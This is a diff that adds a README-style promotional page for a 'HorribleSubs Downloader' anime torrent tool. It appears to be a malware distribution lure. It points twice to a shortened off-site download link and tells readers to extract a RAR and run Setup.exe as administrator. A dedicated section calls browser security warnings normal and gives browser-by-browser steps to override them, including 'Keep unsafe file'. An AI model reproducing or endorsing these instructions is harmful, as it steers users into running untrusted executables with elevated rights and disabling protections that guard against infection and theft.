@@ -1,0 +1,220 @@
+                                                                             ▄▄                          ▄▄  
+▀████▀  ▀████▀▀▄█▀▀▀█▄█   ▀███▀▀▀██▄                                       ▀███                        ▀███  
+  ██      ██  ▄██    ▀█     ██    ▀██▄                                       ██                          ██  
+  ██      ██  ▀███▄         ██     ▀██ ▄██▀██▄▀██▀    ▄█    ▀██▀████████▄    ██   ▄██▀██▄ ▄█▀██▄    ▄█▀▀███  
+  ██████████    ▀█████▄     ██      ████▀   ▀██ ██   ▄███   ▄█   ██    ██    ██  ██▀   ▀███   ██  ▄██    ██  
+  ██      ██  ▄     ▀██     ██     ▄████     ██  ██ ▄█  ██ ▄█    ██    ██    ██  ██     ██▄█████  ███    ██  
+  ██      ██  ██     ██     ██    ▄██▀██▄   ▄██   ███    ███     ██    ██    ██  ██▄   ▄███   ██  ▀██    ██  
+▄████▄  ▄████▄▄▀█████▀    ▄████████▀   ▀█████▀     █      █    ▄████  ████▄▄████▄ ▀█████▀▀████▀██▄ ▀████▀███▄
+                                                                                                             
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                       HORRIBLESUBS DOWNLOADER                             ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+HORRIBLESUBS DOWNLOADER — is a dedicated desktop application designed to automate the downloading of anime episodes from the popular HorribleSubs platform (now part of subsplease.org). This tool simplifies the process of finding, selecting, and downloading your favorite anime series in batch mode. With support for quality selection, automatic RSS feed monitoring, and scheduled downloads, it's the perfect companion for anime enthusiasts who want to build their local collection without manual intervention.
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                             DOWNLOAD                                      ║
+║                 ▶ https://github.guru/s/G4onfmJT                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    ⚡ QUICK INSTALLATION:
+    ──────────────────────────────────────────────────
+    [1] DOWNLOAD    →  HorribleSubs_Downloader.rar
+    [2] EXTRACT     →  WinRAR or 7-Zip
+    [3] RUN         →  Setup.exe (as administrator)
+    [4] CHOOSE      →  Installation directory
+    [5] COMPLETE    →  Follow setup wizard
+    [6] LAUNCH      →  Start downloading anime
+    ──────────────────────────────────────────────────
+
+    ⚡ HOW THE PROGRAM WORKS:
+    ─────────────────────────────────────────────────────────────────
+    
+    🔹 CORE TECHNOLOGY
+    HorribleSubs Downloader operates by connecting to anime release RSS feeds and torrent sources. The program continuously monitors these feeds for new episodes of your subscribed series, automatically fetching torrent files or magnet links and initiating downloads through your preferred torrent client. It intelligently organizes downloaded content into series folders with proper naming conventions .
+    
+    🔹 DOWNLOAD PROCESS
+    The software follows a streamlined workflow:
+    
+    • RSS MONITORING: Connects to HorribleSubs/subsplease RSS feeds
+    • SERIES TRACKING: Monitors for new episodes of your followed shows
+    • QUALITY SELECTION: Filters releases based on resolution (1080p, 720p, 480p)
+    • TORRENT HANDLING: Downloads torrent files or generates magnet links
+    • CLIENT INTEGRATION: Sends downloads to uTorrent, qBittorrent, or other clients
+    • AUTOMATIC ORGANIZATION: Moves completed files to structured folders
+    
+    🔹 RSS FEED INTEGRATION
+    The program supports multiple RSS feed sources:
+    
+    • SUBSPLEASE FEED: Primary source for anime releases
+    • HORRIBLESUBS ARCHIVE: Access to historical releases
+    • CUSTOM FEEDS: Add any anime release RSS feed
+    • FILTERED FEEDS: Create custom feeds by quality or fansub group
+    
+    🔹 SERIES MANAGEMENT
+    
+    • SUBSCRIPTIONS: Follow specific series for automatic downloads
+    • WATCHLIST: Track which episodes you've already downloaded
+    • SEASON TRACKING: Automatically detect and follow new seasons
+    • COMPLETED SERIES: Mark series as complete and stop monitoring
+    • FAVORITES: Quick access to your most-watched shows
+    
+    🔹 QUALITY SELECTION
+    Choose your preferred release quality:
+    
+    • 1080p FULL HD: Highest quality, larger file sizes
+    • 720p HD: Balanced quality and file size
+    • 480p SD: Smaller files, lower quality
+    • BEST AVAILABLE: Auto-selects highest quality present
+    • CUSTOM: Set quality preferences per series
+    
+    🔹 TORRENT CLIENT SUPPORT
+    Integrates with popular torrent clients:
+    
+    • qBITTORRENT: Native integration with WebUI and local client
+    • uTORRENT: Support for both classic and WebUI versions
+    • DELUGE: Integration via WebAPI
+    • TRANSMISSION: Support for remote Transmission instances
+    • MAGNET LINKS: Direct magnet link handling
+    • TORRENT FILES: Automatic torrent file downloading
+    
+    🔹 AUTOMATION FEATURES
+    
+    • SCHEDULED CHECKS: Automatically check for new episodes at set intervals
+    • INSTANT NOTIFICATION: Real-time download when new episodes release
+    • BACKFILL DOWNLOAD: Download missing episodes from previous seasons
+    • COMPLETE SERIES: One-click download of entire series
+    • WEEKLY SCHEDULE: View and download based on release schedules
+    
+    🔹 ORGANIZATION
+    Automatically organizes your anime collection:
+    
+    • SERIES FOLDERS: Creates folders for each anime series
+    • SEASON FOLDERS: Organizes episodes by season number
+    • NAMING CONVENTION: Consistent episode naming (Series - S01E01 - Title)
+    • METADATA: Optional metadata tagging for media servers
+    • DUPLICATE DETECTION: Skips already downloaded episodes
+    
+    🔹 USER INTERFACE
+    
+    • SERIES BROWSER: Browse available series with cover art
+    • RELEASE CALENDAR: View upcoming releases by date
+    • DOWNLOAD QUEUE: Monitor active and pending downloads
+    • SEARCH FUNCTION: Find specific series quickly
+    • FILTER OPTIONS: Filter by genre, season, or popularity
+    • DARK MODE: Easy on the eyes for nighttime use
+    
+    🔹 ADVANCED FEATURES
+    
+    • KEYWORD FILTERING: Exclude releases with specific keywords
+    • FANSUB PREFERENCE: Prioritize specific fansub groups
+    • LANGUAGE SELECTION: Choose subtitle languages
+    • POST-PROCESSING: Run scripts after download completion
+    • RSS FILTERS: Advanced filtering using regex patterns
+    • NOTIFICATIONS: Desktop and email alerts for new downloads
+    
+    🔹 MEDIA SERVER INTEGRATION
+    Works seamlessly with media server software:
+    
+    • PLEX: Automatic library scanning after downloads
+    • JELLYFIN: Trigger library updates on new content
+    • EMBY: Post-download organization for Emby servers
+    • KODI: Library update notifications
+    
+    🔹 DOWNLOAD STATISTICS
+    
+    • DOWNLOAD HISTORY: Complete log of all downloads
+    • BANDWIDTH USAGE: Track monthly download totals
+    • SERIES STATISTICS: How many episodes per series downloaded
+    • COMPLETION RATES: Track your watching progress
+    
+    🔹 KEYBOARD SHORTCUTS
+    
+    ─────────────────────────────────────────────────────────────────
+    Ctrl+N              │ Add new series subscription
+    Ctrl+D              │ Start download of selected episode
+    Ctrl+Shift+D        │ Download entire series
+    Ctrl+F              │ Search series
+    Ctrl+R              │ Refresh RSS feeds
+    Ctrl+O              │ Open download folder
+    Ctrl+P              │ Open preferences
+    F5                  │ Check for new episodes now
+    ─────────────────────────────────────────────────────────────────
+    
+    🔹 POPULAR ANIME CATEGORIES
+    
+    • SEASONAL ANIME: Currently airing shows by season
+    • POPULAR SERIES: Most downloaded anime
+    • TOP RATED: Highest rated shows
+    • GENRES: Action, Romance, Comedy, Fantasy, Sci-Fi, Slice of Life
+    • CONTINUING: Long-running series with ongoing episodes
+    ─────────────────────────────────────────────────────────────────
+
+    ⚡ SYSTEM REQUIREMENTS:
+    ─────────────────────────────────────────────────────────────────
+    OS              │ Windows 7/8/10/11 (64-bit recommended)
+    RAM             │ 2GB minimum (4GB+ recommended)
+    CPU             │ Dual-core 1.5GHz or higher
+    STORAGE         │ 200MB for installation + space for anime
+    INTERNET        │ Broadband connection required
+    TORRENT CLIENT  │ qBittorrent, uTorrent, Deluge, or Transmission
+    .NET FRAMEWORK  │ Version 4.7.2 or higher
+    ─────────────────────────────────────────────────────────────────
+
+    🔖 TAGS
+    ─────────────────────────────────────────────────────────────────
+    anime downloader     │ horriblesubs         │ subsplease
+    torrent downloader   │ anime episodes       │ batch download
+    anime torrent        │ series downloader    │ anime automation
+    japanese anime       │ subbed anime         │ anime collection
+    rss downloader       │ anime tracker        │ weekly anime
+    ─────────────────────────────────────────────────────────────────
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                 ⚠ IMPORTANT DOWNLOAD WARNING                              ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    Your browser may show a warning when downloading this file.
+    This is completely normal.
+
+    ═══════════════════════════════════════════════════════════════════════
+    
+    ❓ WHY DOES THIS HAPPEN?
+    
+    The warning appears because the file:
+    
+    • Is not distributed through major app stores (Microsoft Store)
+    • Has fewer downloads than mainstream software
+    • Uses .exe format or compressed archives (.rar/.zip)
+    • Is new or less known in browser databases
+    
+    ⚡ This does NOT mean the file is dangerous. This is a standard browser 
+       protection mechanism triggered by download count, not by detecting 
+       malware. Similar downloading tools receive the same warnings.
+
+    ═══════════════════════════════════════════════════════════════════════
+
+    📋 BROWSER INSTRUCTIONS:
+    ─────────────────────────────────────────────────────────────────
+    Browser         │ Action
+    ─────────────────────────────────────────────────────────────────
+    Chrome/Edge     │ Click "Keep" or "Keep anyway"
+                    │ → Confirm "Keep unsafe file"
+    ─────────────────────────────────────────────────────────────────
+    Firefox         │ Click arrow → "Allow download"
+    ─────────────────────────────────────────────────────────────────
+    Opera/Brave     │ Click "Keep" in download warning
+    ─────────────────────────────────────────────────────────────────
+
+    ═══════════════════════════════════════════════════════════════════════
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                             DOWNLOAD                                      ║
+║                 ▶ https://github.guru/s/G4onfmJT                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+────────────────────────────────────────────────────────────────────────────
+Disclaimer: This software is a third-party tool and is not affiliated with HorribleSubs, subsplease, or any anime distribution platforms. This tool is intended for downloading content that is legally available for free or content you have rights to download. Users are responsible for complying with copyright laws in their jurisdiction and respecting content creators' rights. The developers recommend supporting official anime releases when possible.
+────────────────────────────────────────────────────────────────────────────
